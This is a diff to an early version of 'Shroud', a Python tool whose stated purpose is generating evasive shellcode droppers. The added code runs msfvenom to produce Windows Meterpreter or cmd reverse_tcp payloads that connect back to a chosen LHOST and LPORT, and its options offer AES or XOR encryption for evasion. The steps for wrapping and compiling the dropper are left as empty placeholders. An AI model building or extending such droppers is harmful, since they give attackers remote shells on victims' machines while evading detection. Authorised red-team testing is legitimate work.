@@ -1,4 +1,7 @@
 #!/usr/bin/python3
+import argparse
+import subprocess
+
 print("""
                                              .::
        .::                                   .::                                                                                                                                                                                 
@@ -8,13 +11,13 @@ print("""
     .::.:   .:: .::    .::  .:: .::  .::.:   .::                                                                                                                                                                                 
 .:: .::.::  .::.:::      .::      .::.:: .:: .::
                   
-				  by twopoint""")
-import argparse
+				  by twopoint
+				  """)
 parser = argparse.ArgumentParser(
                     prog='Shroud 0.1',
                     description='Generate evasive shellcode droppers.',
                     epilog='https://github.com/Jake123otte1/Shroud')
-parser.add_argument('input', help='Input shellcode file')
+parser.add_argument('--input', help='Input custom shellcode file')
 parser.add_argument('output', help='Output dropper file. Specify .exe or .dll.')
 parser.add_argument('-M', help='Generate a Meterpreter template payload.', action="store_true")
 parser.add_argument('-S', help='Generate a reverse shell (cmd) template payload.',  action="store_true")
@@ -26,8 +29,28 @@ parser.add_argument('--xor', help='Use XOR encryption. Default is AES-256.', act
 parser.add_argument('--dont-encrypt', help='Don\'t encrypt the payload.', action="store_true")
 args = parser.parse_args()
 
+# Generate templates if specified
+def generateTemplate():
+	if args.M: # Meterpreter shell
+		subprocess.run(["msfvenom","-p","windows/x64/meterpreter/reverse_tcp",f"LHOST={args.lhost}",f"LPORT={args.lport}","-f","raw","-o","./output/shellcode.raw"], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
+	if args.S: # CMD shell
+		subprocess.run(["msfvenom","-p","windows/x64/shell/reverse_tcp",f"LHOST={args.lhost}",f"LPORT={args.lport}","-f","raw","-o","./output/shellcode.raw"], stdout = subprocess.DEVNULL, stderr = subprocess.DEVNULL)
+
+
 def main():
-	print("")
+	# Generate templates if necessary
+	if args.M or args.S:
+		print(f"[~] Generating shellcode from template. (IP: {args.lhost}, PORT: {args.lport})")
+		generateTemplate()
+
+	# Encrypt payload (check xor and don't-encrypt)
+	
+
+	# Update dropper file wrapper (update payload, process name, export)
+
+
+	# Compile
+	
 
 
 if __name__ == '__main__':
